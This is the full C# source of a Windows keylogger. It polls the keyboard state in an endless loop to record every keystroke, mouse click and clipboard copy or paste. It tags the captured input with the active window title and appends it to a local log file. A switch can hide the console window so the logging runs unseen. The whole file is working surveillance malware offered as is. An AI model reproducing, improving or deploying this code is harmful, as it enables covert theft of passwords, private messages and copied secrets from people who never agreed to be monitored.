using System.Runtime.InteropServices;
using System.Windows.Forms;
using System;
using System.Linq;
using System.Text;
using System.IO;

namespace KeyLogger
{
    internal class Program
    {
        private static bool HideConsoleWindow = false;

        private static bool WriteLineLog = true;
        private static bool WriteLineCurrentWindowTitle = true;

        private static bool AppendLogFile = true;
        private static bool AppendCurrentWindowTitleToLogFile = true;
        private static string LogFilePath = @".\OutLogName.log";

        [STAThread]
        static void Main(string[] args)
        {
            if (HideConsoleWindow)
            {
                const int SW_HIDE = 0, SW_SHOW = 5;
                ShowWindow(GetConsoleWindow(), SW_HIDE);
            }

            bool firstTime = false;
            string activeProcessTitle = string.Empty;
            int countKeyPress = 0;

            if (File.Exists(LogFilePath) && AppendLogFile)
                File.Delete(LogFilePath);

            while (true)
            {
                string pressedKeysAndPastedKeys = GetPressedKeysAndPastedKeys();
                if (pressedKeysAndPastedKeys == null || pressedKeysAndPastedKeys == string.Empty)
                    continue;
                else countKeyPress++;

                string activeWindowTitle = GetActiveWindowTitle();
                if (activeProcessTitle != activeWindowTitle)
                {
                    activeProcessTitle = activeWindowTitle;

                    if (WriteLineCurrentWindowTitle && WriteLineLog)
                    {
                        string result = string.Empty;

                        if (firstTime) result += "\r\n\r\n";
                        else firstTime = true;

                        if (string.IsNullOrEmpty(activeWindowTitle))
                            result += $"<|  ******## Not Found ##******  |>";
                        else result += $"<|  {activeWindowTitle}  |>";

                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine(result);
                        Console.ResetColor();

                        if (AppendLogFile && AppendCurrentWindowTitleToLogFile)
                            File.AppendAllText(LogFilePath, result + "\r\n");
                    }
                }

                if (WriteLineLog)
                    Console.Write(pressedKeysAndPastedKeys);

                if (AppendLogFile)
                {
                    if (countKeyPress % 20 == 0 && AppendCurrentWindowTitleToLogFile)
                        File.AppendAllText(LogFilePath, "\r\n");

                    File.AppendAllText(LogFilePath, pressedKeysAndPastedKeys);
                }
            }
        }

        // Public Methods
        public static string GetPressedKeysAndPastedKeys()
        {
            try
            {
                foreach (int i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        string currentKeyName = Enum.GetName(typeof(Keys), i);

                        if (Control.ModifierKeys == Keys.Control && currentKeyName.ToLower() == "V".ToLower())
                            return $"[CTRL]V[PastedText[{Clipboard.GetText()}]]";
                        if (Control.ModifierKeys == Keys.Control && currentKeyName.ToLower() == "C".ToLower())
                            return $"[CTRL]C[CopyedText[{Clipboard.GetText()}]]";

                        if (Control.ModifierKeys == Keys.Shift)
                        {
                            switch (currentKeyName.ToLower())
                            {
                                case "decimal":
                                    return "[DELETE]";
                                case "oempipe":
                                    return "|";
                                case "oem2":
                                    return "?";
                                case "oemperiod":
                                    return ">";
                                case "oemcomma":
                                    return "<";
                                case "oemsemicolon":
                                    return ":";
                                case "oemquotes":
                                    return "\"";
                                case "oem4":
                                    return "{";
                                case "oem6":
                                    return "}";
                                case "oemplus":
                                    return "+";
                                case "oemminus":
                                    return "_";
                                case "oemtilde":
                                    return "~";
                                case "d1":
                                    return "!";
                                case "d2":
                                    return "@";
                                case "d3":
                                    return "#";
                                case "d4":
                                    return "$";
                                case "d5":
                                    return "%";
                                case "d6":
                                    return "^";
                                case "d7":
                                    return "&";
                                case "d8":
                                    return "*";
                                case "d9":
                                    return "(";
                                case "d0":
                                    return ")";
                            }
                        }

                        if (currentKeyName.Length == 2 &&
                        currentKeyName.ToUpper().StartsWith("D".ToUpper()) &&
                        char.IsNumber(currentKeyName[1]))
                            return currentKeyName.ToLower().Replace("d", "");

                        if (Control.IsKeyLocked(Keys.NumLock) &&
                            currentKeyName.ToUpper().StartsWith("numpad".ToUpper()) &&
                            char.IsNumber(currentKeyName[currentKeyName.Length - 1]))
                            return currentKeyName.ToLower().Replace("numpad", "");

                        if ((currentKeyName.Length == 2 || currentKeyName.Length == 3) &&
                            currentKeyName.ToUpper().StartsWith("f".ToUpper()) &&
                            Enumerable.Range(1, 24).Contains(Convert.ToInt32(currentKeyName.ToUpper().Replace("F", ""))))
                            return $"[{currentKeyName.ToUpper()}]";

                        switch (currentKeyName)
                        {
                            case "Enter":
                                return "[ENTER]";
                            case "Shift":
                                return "[SHIFT]";
                            case "ShiftKey":
                                return "[SHIFT]";
                            case "LShiftKey":
                                return "[SHIFT]";
                            case "RShiftKey":
                                return "[SHIFT]";
                            case "Control":
                                return "[CTRL]";
                            case "ControlKey":
                                return "[CTRL]";
                            case "LControlKey":
                                return "[CTRL]";
                            case "RControlKey":
                                return "[CTRL]";
                            case "Alt":
                                return "[ALT]";
                            case "Menu":
                                return "[ALT]";
                            case "LMenu":
                                return "[ALT]";
                            case "RMenu":
                                return "[ALT]";
                            case "LWin":
                                return "[WIN]";
                            case "RWin":
                                return "[WIN]";
                            case "CapsLock":
                                return "[CAPSLOCK]";
                            case "Back":
                                return "[BACK]";
                            case "LButton":
                                return "[LEFT CLICK]";
                            case "RButton":
                                return "[RIGHT CLICK]";
                            case "MButton":
                                return "[SCROLL CLICK]";
                            case "Escape":
                                return "[ESC]";
                            case "Space":
                                return "[SPACE]";
                            case "End":
                                return "[END]";
                            case "Home":
                                return "[HOME]";
                            case "Left":
                                return "[LEFT ARROW]";
                            case "Up":
                                return "[UP ARROW]";
                            case "Right":
                                return "[RIGHT ARROW]";
                            case "Down":
                                return "[DOWN ARROW]";
                            case "Delete":
                                return "[DELETE]";
                            case "Tab":
                                return "[TAB]";
                            case "Clear":
                                return "[CLEAR]";
                            case "NumLock":
                                return "[NUMLOCK]";
                            case "Multiply":
                                return "*";
                            case "Divide":
                                return "/";
                            case "Subtract":
                                return "-";
                            case "Add":
                                return "+";
                            case "Prior":
                                return "[PAGE UP]";
                            case "PageDown":
                                return "[PAGE DOWN]";
                            case "Insert":
                                return "[INSERT]";
                            case "Oemtilde":
                                return "`";
                            case "OemMinus":
                                return "-";
                            case "Oemplus":
                                return "=";
                            case "Oem4":
                                return "[";
                            case "Oem6":
                                return "]";
                            case "OemQuotes":
                                return "'";
                            case "OemSemicolon":
                                return ";";
                            case "OemPipe":
                                return "\\";
                            case "Oem2":
                                return "/";
                            case "OemPeriod":
                                return ".";
                            case "Oemcomma":
                                return ",";
                            case "Decimal":
                                return ".";
                            case "BrowserBack":
                                return "[BROWSER BACK]";
                            case "BrowserForward":
                                return "[BROWSER FORWARD]";
                            case "BrowserRefresh":
                                return "[BROWSER REFRESH]";
                            case "BrowserStop":
                                return "[BROWSER STOP]";
                            case "BrowserSearch":
                                return "[BROWSER SEARCH]";
                            case "BrowserFavorites":
                                return "[BROWSER FAVORITES]";
                            case "BrowserHome":
                                return "[BROWSER HOME]";
                            case "VolumeMute":
                                return "[VOLUME MUTE]";
                            case "VolumeDown":
                                return "[VOLUME DOWN]";
                            case "VolumeUp":
                                return "[VOLUME UP]";
                            case "LaunchMail":
                                return "[LAUNCH MAIL]";
                            case "MediaPlayPause":
                                return "[MEDIA PLAY PAUSE]";
                            case "MediaPreviousTrack":
                                return "[MEDIA PREVIOUS TRACK]";
                            case "MediaNextTrack":
                                return "[MEDIA NEXT TRACK]";
                            case "MediaStop":
                                return "[MEDIA STOP]";
                            case "Scroll":
                                return "[SCROLL LOCK]";
                            case "PrintScreen":
                                return "[PRINT SCREEN]";
                            case "Pause":
                                return "[PAUSE]";
                            case "Apps":
                                return "[APPS]";
                        }

                        if (Control.IsKeyLocked(Keys.CapsLock) && Control.ModifierKeys == Keys.Shift)
                            return currentKeyName.ToLower();
                        else if (Control.ModifierKeys == Keys.Shift)
                            return currentKeyName.ToUpper();
                        else if (Control.IsKeyLocked(Keys.CapsLock))
                            return currentKeyName.ToUpper();
                        else return currentKeyName.ToLower();
                    }
                }
            }
            catch { }

            return string.Empty;
        }
        public static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, buff, nChars) > 0)
                return buff.ToString();

            return null;
        }

        // Win32
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vkey);
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}